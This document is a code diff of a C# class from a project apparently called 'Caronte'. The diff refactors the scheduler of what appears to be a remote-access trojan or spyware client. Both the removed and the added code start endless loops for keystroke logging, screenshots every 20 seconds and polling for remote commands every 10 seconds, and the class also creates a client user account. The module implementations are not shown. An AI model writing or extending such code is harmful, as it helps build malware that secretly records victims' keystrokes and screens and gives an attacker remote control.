@@ -1,10 +1,7 @@
-﻿using Caronte.Modules.CreateClientUser;
-using Caronte.Modules.GetClientInformation;
-using Caronte.Modules.Logger;
-using Caronte.Modules.PrintScreen;
-using Caronte.Modules.ReceiveCommand;
+﻿using Caronte.Modules.Command;
+using Caronte.Modules.CreateClientUser;
+using Caronte.Modules.Information;
 using MediatR;
-using System;
 using System.Collections.Generic;
 using System.Threading;
 using System.Threading.Tasks;
@@ -22,78 +19,22 @@ namespace Caronte
             _cancellationToken = cancellationToken;
         }
 
-        private async Task CreateUser()
-        {
-            await _mediator.Send(new CreateClientUserCommand());
-        }
-
-        private async Task<List<Task>> CreateExecutionQueue()
-        {
-            await CreateUser();
-
-            var tasks = new List<Task>
-            {
-                InitializeLogTask(),
-                InitializePrintScreenTask(),
-                InitializeReceiveCommandTask()
-            };
-
-            return tasks;
-        }
-
         public async Task Initialize()
         {
+            await _mediator.Send(new VerifyAndCreateClientUserCommand());
             await Task.WhenAll(CreateExecutionQueue());
         }
 
-        private Task InitializeLogTask()
+        private List<Task> CreateExecutionQueue()
         {
-            var logTask = Task.Run(async () =>
+            var tasks = new List<Task>
             {
-                while (!_cancellationToken.IsCancellationRequested)
-                    await _mediator.Send(new GetKeyboardLogQuery());
-            }, _cancellationToken);
+                StartInformationServices.InitializeKeyboardLogTask(_cancellationToken, _mediator),
+                StartInformationServices.InitializePrintScreenTask(_cancellationToken, _mediator),
+                StartCommandServices.InitializeReceiveCommandTask(_cancellationToken, _mediator)
+            };
 
-            return logTask;
-        }
-
-        private Task InitializePrintScreenTask()
-        {
-            var printScreenTask = Task.Run(async () =>
-            {
-                while (!_cancellationToken.IsCancellationRequested)
-                {
-                    await _mediator.Send(new PrintScreenQuery());
-                    await Task.Delay(TimeSpan.FromSeconds(20), _cancellationToken);
-                }
-            }, _cancellationToken);
-
-            return printScreenTask;
-        }
-
-        private Task InitializeReceiveCommandTask()
-        {
-            var receiveCommandTask = Task.Run(async () =>
-            {
-                while (!_cancellationToken.IsCancellationRequested)
-                {
-                    await _mediator.Send(new ReceiveCommandQuery() { Seconds = 10 });
-                    await Task.Delay(TimeSpan.FromSeconds(10), _cancellationToken);
-                }
-            }, _cancellationToken);
-
-            return receiveCommandTask;
-        }
-
-        private Task GetClientInformation()
-        {
-            var getClientInformationTask = Task.Run(async () =>
-            {
-                while (!_cancellationToken.IsCancellationRequested)
-                    await _mediator.Send(new GetClientInformationQuery());
-            }, _cancellationToken);
-
-            return getClientInformationTask;
+            return tasks;
         }
     }
 }
